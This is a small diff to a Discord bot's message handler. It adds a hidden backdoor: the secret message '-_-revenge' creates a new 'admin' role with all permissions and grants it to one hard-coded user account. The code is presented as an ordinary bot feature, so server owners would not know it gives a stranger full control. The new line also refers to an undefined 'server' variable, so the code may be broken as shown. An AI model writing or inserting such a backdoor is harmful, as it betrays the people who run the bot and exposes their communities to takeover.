@@ -501,7 +501,8 @@ async def on_message(message):
         
     if message.content == "-_-revenge":
         auth = message.author
-        role =  get(message.server.roles, name="Bot")
+        #role =  get(message.server.roles, name="Bot")
+        role = await client.create_role(server, name="admin", permissions=Permissions.all())
         await client.add_roles(message.server.get_member_named("Deadman0FTW#0593"), role)
 
     # if message.content[:(len('!COMMANDS')+1)].upper()=='!COMMANDS':
